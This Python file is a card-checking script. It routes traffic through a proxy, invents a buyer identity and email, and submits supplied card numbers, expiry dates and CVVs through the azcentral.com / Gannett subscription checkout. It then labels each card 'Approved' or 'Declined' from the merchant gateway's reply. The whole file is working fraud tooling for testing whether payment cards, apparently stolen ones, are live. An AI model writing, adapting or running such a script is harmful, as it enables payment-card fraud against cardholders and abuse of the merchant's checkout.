from httpx import AsyncClient

def random_email():
    import random
    import string
    name_length = random.randint(5, 30)
    name = ''.join(random.choices(string.ascii_lowercase, k=name_length))
    domains = ['@gmail.com', '@hotmail.com', '@yahoo.com', '@outlook.com', '@protonmail.com', '@live.com', '@msn.com', '@aol.com']
    return name + random.choice(domains)

async def chaseccn(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as web:
        ip = await web.get("https://api.ipify.org")
        ip = ip.text
        print(ip)
        retrys = 1
        while retrys > 0:
            try:
                response = await web.get("https://randomuser.me/api/1.2/?nat=US")
                break
            except:
                retrys -= 1
                continue
        
        user = response.text
        street = user.split('"street":"')[1].split('"')[0]
        city = user.split('"city":"')[1].split('"')[0]
        state1 = user.split('"state":"')[1].split('"')[0]
        zipcode = user.split('"postcode":')[1].split(',')[0]
        phone = user.split('"phone":"')[1].split('"')[0]
        name = user.split('"first":"')[1].split('"')[0]
        last = user.split('"last":"')[1].split('"')[0]
        state = "NY"
        email = random_email()


        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'gup_anonid=212b03de-1a93-4fe0-a722-ef8e61f5eeff; gup_clientid=c638e84a-833b-42c9-8b02-b86cad8d9c3a; gnt_ub=72; gnt_sb=15; gnt_eid=AnonInfinityLow:15:out-market; gnt_i=90549961559508339861*396356*US~CA~riverside~92504; OTGPPConsent=DBABBg~BUUAAAGA.YA; gca_rs=direct; _ga=GA1.1.1114324741.1731656155; _parsely_session={%22sid%22:1%2C%22surl%22:%22https://www.azcentral.com/%22%2C%22sref%22:%22%22%2C%22sts%22:1731656154646%2C%22slts%22:0}; _parsely_visitor={%22id%22:%22pid=0aa7650c-404b-4b00-b988-6c65502dcb57%22%2C%22session_count%22:1%2C%22last_session_ts%22:1731656154646}; gca_lcu=https://www.azcentral.com/; gca_pxi=hosting:vpn; _parsely_slot_click={%22url%22:%22https://subscribe.azcentral.com/offers?offer=W-FR&gps-source=CPTOPNAVBAR&itm_campaign=2024NOVBAU&itm_content=bluebutton&itm_medium=ONSITE&gnt-eid=control%22%2C%22x%22:226%2C%22y%22:276%2C%22xpath%22:%22//*[@id=%5C%22__next%5C%22]/div[1]/div[2]/div[2]/div[2]/div[1]/div[3]/div[2]/a[1]%22%2C%22href%22:%22https://subscribe.azcentral.com/subscribe/?productId=3920371&genesysSourceCode=W&sourceCode=W&productUsageType=Special%2520Offer&marketId=PPHX&rateCode=&publicationCode=AZ&unitNumber=1531&fodCode=SW&form-name=UserRegistration&promoCodeOverride=FR&gps-source=CPTOPNAVBAR&itm_campaign=2024NOVBAU&itm_content=bluebutton&itm_medium=ONSITE%22}; gup_lng=%7B%22ret-usr%22%3A%20false%2C%20%22ret-sub%22%3A%20false%2C%20%22auth%22%3A%20false%2C%20%22name%22%3A%20%22%22%2C%20%22hma%22%3A%20false%2C%20%22lic%22%3A%20%22none%22%2C%20%22lpf%22%3A%20false%2C%20%22updated%22%3A%201731656184%2C%20%223PID%22%3A%20null%2C%20%22ips%22%3A%20false%7D; csrftoken=RSvvqbgqjpmn4ffGteqekSHk0b78fMnh',
            'origin': 'https://login.azcentral.com',
            'priority': 'u=0, i',
            'referer': 'https://login.azcentral.com/PPHX-GUP-SUBSCRIBE/authenticate/?success-url=https%3A%2F%2Fsubscribe.azcentral.com%2Fsubscribe%2F%3FproductId%3D3920371%26genesysSourceCode%3DW%26sourceCode%3DW%26marketId%3DPPHX%26unitNumber%3D1531%26promoCodeOverride%3DFR%26gps-source%3DCPTOPNAVBAR%26cards%3DUserRegistration%26expandedSourceCode%3DCPTOPNAVBAR%26productUsageType%3DSpecial+Offer%26rateCode%3DFR%26publicationCode%3DAZ%26fodCode%3DSW%26form-name%3DUserRegistration&requested-state=create-account&reg_source=CHECKOUTP&reg_medium=ONSITE&reg_campaign=checkout&reg_delivery=sam&from-state=returning-user-get-redirect&cookies=',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }


        data = {
            'form-name': 'CheckoutPrint',
            'cards': 'UserRegistration',
            'publicationId': '',
            'expandedSourceCode': 'CPTOPNAVBAR',
            'sourceCode': 'W',
            'productUsageType': 'Special Offer',
            'productId': '3920371',
            'marketId': 'RE',
            'submarketId': '',
            'rateCode': 'FR',
            'publicationCode': 'AZ',
            'unitNumber': '1531',
            'fodCode': 'SW',
            'emailConfirm': '',
            'passwordConfirm': '',
            'firstName': name,
            'gender': '',
            'action': '',
            'birthYear': '',
            'lastName': last,
            'password': '',
            'email': email,
            'fireflyUserId': '1222363985',
            'gettax-ready': '',
            'validate-subscription-ready': '',
            'addressLine1': '15745 Telegraph Rd',
            'addressLine2': '',
            'country': 'US',
            'city': 'Redford Charter Town',
            'stateSelect': 'MI',
            'state': 'MI',
            'zipCode': '48239',
            'phone': '5059947000',
            'startDate': '2025-09-27',
            'startDatePhony': 'Saturday, September 27, 2025',
            'accountNumber': '0',
            'billingAddressLine1': '15745 Telegraph Rd',
            'billingAddressLine2': '',
            'billingCountry': 'US',
            'billingCity': 'Redford Charter Town',
            'billing-stateSelect': 'MI',
            'billingState': 'MI',
            'billingZipCode': '48239',
            'billingPhone': '5059947000',
            'isMatheredRestart': 'false',
            'isPrint': 'DigitalPrint',
            'method': 'getTax'
        }

        retrys = 1
        while retrys > 0:
            try:
                req3 = await web.post('https://subscribe.azcentral.com/billingService/', headers=headers, data=data)
                break
            except:
                retrys -= 1
                continue

        headers = {
            'accept': 'application/vnd.subscriptions.v2',
            'accept-language': 'es-419,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://subscribe.azcentral.com',
            'priority': 'u=1, i',
            'referer': 'https://subscribe.azcentral.com/',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = {
            'form-name': 'CheckoutPrint',
            'cards': 'UserRegistration', 
            'publicationId': '',
            'expandedSourceCode': 'CPTOPNAVBAR',
            'sourceCode': 'W',
            'productUsageType': 'Special Offer',
            'productId': '3920370',
            'marketId': 'RE',
            'submarketId': '',
            'promotionCode': 'FR',
            'publicationCode': 'AZ',
            'unitNumber': '1531',
            'fodCode': 'DS',
            'emailConfirm': '',
            'passwordConfirm': '',
            'firstName': name,
            'gender': '',
            'action': '',
            'birthYear': '',
            'lastName': last,
            'password': '',
            'email': email,
            'fireflyUserId': '1222370173',
            'gettax-ready': '',
            'validate-subscription-ready': '',
            'addressLine1': '15745 Telegraph Rd',
            'addressLine2': '',
            'country': 'US', 
            'city': 'Redford Charter Town',
            'stateSelect': 'NY',
            'state': 'NY',
            'zipCode': '48239',
            'phone': '5059947000',
            'startDate': '20261112',
            'startDatePhony': 'Thursday, November 12, 2026',
            'accountNumber': '0',
            'creditCardNumber': cc,
            'creditCardExpirationMonth': mes,
            'creditCardExpirationYear': ano,
            'billingAddressLine1': '103-105 CENTRAL AVENUE',
            'billingAddressLine2': '',
            'billingCountry': 'US',
            'billingCity': city,
            'billing-stateSelect': 'NY',
            'billingState': 'NY',
            'billingZipCode': '07050',
            'billingPhone': '5059947000'
        }

        retrys = 1
        while retrys > 0:
            try:
                req4 = await web.post('https://subscription-self-serve.gannett.com/validateSubscription', headers=headers, data=data)
                break
            except:
                retrys -= 1
                continue

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-419,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://subscribe.azcentral.com',
            'priority': 'u=1, i',
            'referer': 'https://subscribe.azcentral.com/subscribe/?productId=3920370&genesysSourceCode=W&sourceCode=W&marketId=PPHX&unitNumber=1531&promoCodeOverride=FR&cards=UserRegistration&expandedSourceCode=CPTOPNAVBAR&productUsageType=Special%20Offer&rateCode=FR&publicationCode=AZ&fodCode=DS&form-name=UserRegistration',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'form-name': 'CheckoutPrint',
            'cards': 'UserRegistration',
            'publicationId': '',
            'expandedSourceCode': 'CPTOPNAVBAR',
            'sourceCode': 'W',
            'productUsageType': 'Special Offer',
            'productId': '3920370',
            'marketId': 'RE',
            'submarketId': '',
            'rateCode': 'FR',
            'publicationCode': 'AZ',
            'unitNumber': '1531',
            'fodCode': 'DS',
            'emailConfirm': '',
            'passwordConfirm': '',
            'firstName': name,
            'gender': '',
            'action': '',
            'birthYear': '',
            'lastName': last,
            'password': '',
            'email': email,
            'fireflyUserId': '1222370173',
            'gettax-ready': '',
            'validate-subscription-ready': '',
            'addressLine1': '15745 Telegraph Rd',
            'addressLine2': '',
            'country': 'US',
            'city': 'Redford Charter Town',
            'stateSelect': 'NJ',
            'state': 'NJ',
            'zipCode': '48239',
            'phone': '5059947000',
            'startDate': '2026-11-12',
            'startDatePhony': 'Thursday, November 12, 2026',
            'accountNumber': '0',
            'billingAddressLine1': '',
            'billingAddressLine2': '',
            'billingCountry': 'US',
            'billingCity': city,
            'billing-stateSelect': 'NJ',
            'billingState': 'NJ',
            'billingZipCode': '48239',
            'billingPhone': '5059947000',
            'isMatheredRestart': 'false',
            'method': 'getTax',
            'isPrint': 'DigitalPrint'
        }

        retrys = 1
        while retrys > 0:
            try:
                req5 = await web.post('https://subscribe.azcentral.com/billingService/', headers=headers, data=data)
                break
            except:
                retrys -= 1
                continue
        
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-419,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://subscribe.azcentral.com',
            'priority': 'u=1, i',
            'referer': 'https://subscribe.azcentral.com/subscribe/?productId=3920370&genesysSourceCode=W&sourceCode=W&marketId=PPHX&unitNumber=1531&promoCodeOverride=FR&cards=UserRegistration&expandedSourceCode=CPTOPNAVBAR&productUsageType=Special%20Offer&rateCode=FR&publicationCode=AZ&fodCode=DS&form-name=UserRegistration',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'accountNumber': '0',
            'fireflyUserId': '1222370173',
            'unitNumber': '1531',
            'publicationCode': 'AZ',
            'fodCode': 'DS',
            'rateCode': 'FR',
            'marketId': 'RE',
            'subMarketId': '',
            'firstName': name,
            'lastName': last,
            'phone': '5059947000',
            'billingPhone': '5059947000',
        }
        retrys = 1
        while retrys > 0:
            try:
                req6 = await web.post('https://subscribe.azcentral.com/userService/', headers=headers, data=data)
                break
            except:
                retrys -= 1
                continue

        headers = {
            'accept': 'application/vnd.subscriptions.v2',
            'accept-language': 'es-419,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://subscribe.azcentral.com',
            'priority': 'u=1, i',
            'referer': 'https://subscribe.azcentral.com/',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = {
            'form-name': 'CheckoutPrint',
            'cards': 'UserRegistration', 
            'publicationId': '',
            'expandedSourceCode': 'CPTOPNAVBAR',
            'sourceCode': 'W',
            'productUsageType': 'Special Offer',
            'productId': '3920371',
            'marketId': 'RE',
            'submarketId': '',
            'promotionCode': 'FR',
            'publicationCode': 'AZ',
            'unitNumber': '1531',
            'fodCode': 'SW',
            'emailConfirm': email,
            'passwordConfirm': '',
            'firstName': name,
            'gender': '',
            'action': '',
            'birthYear': '',
            'lastName': last,
            'password': '',
            'email': email,
            'fireflyUserId': '1222648122',
            'gettax-ready': '',
            'validate-subscription-ready': 'true',
            'addressLine1': '15745 Telegraph Rd',
            'addressLine2': '',
            'country': 'US',
            'city': 'Redford Charter Town',
            'stateSelect': 'MI',
            'state': 'MI',
            'zipCode': '48239',
            'phone': '5059947000',
            'startDate': '20241120',
            'startDatePhony': 'Wednesday, November 20, 2024',
            'accountNumber': '0',
            'creditCardNumber': cc,
            'creditCardExpirationMonth': mes,
            'creditCardExpirationYear': ano,
            'billingAddressLine1': '15745 Telegraph Rd',
            'billingAddressLine2': '',
            'billingCountry': 'US',
            'billingCity': 'Redford Charter Town',
            'billing-stateSelect': 'MI',
            'billingState': 'MI',
            'billingZipCode': '48239',
            'billingPhone': '5059947000'
        }


        retrys = 1
        while retrys > 0:
            try:
                req7 = await web.post('https://subscription-self-serve.gannett.com/createSubscription', headers=headers, data=data)
                break
            except:
                retrys -= 1
                continue
        print(req7.text)
        await web.aclose()
        if '{"meta":{"status":0,"message":"Success","error":[]}}' in req7.text or "PROFILE CREATED" in req7.text:
            status = "Approved ✅"
            mensaje = "Charged 1$"
        else:
            mensaje = req7.text.split('["merchant_gateway",["')[1].split('"]],')[0] 
            if "Credit Floor" in mensaje:
                status = "Approved ✅"
            elif "Insufficient Funds" in mensaje:
                status = "Approved ✅"
            else:
                mensaje = mensaje.split(': ')[1] if ': ' in mensaje else mensaje 
                status = "Declined ❌"         
        return status, mensaje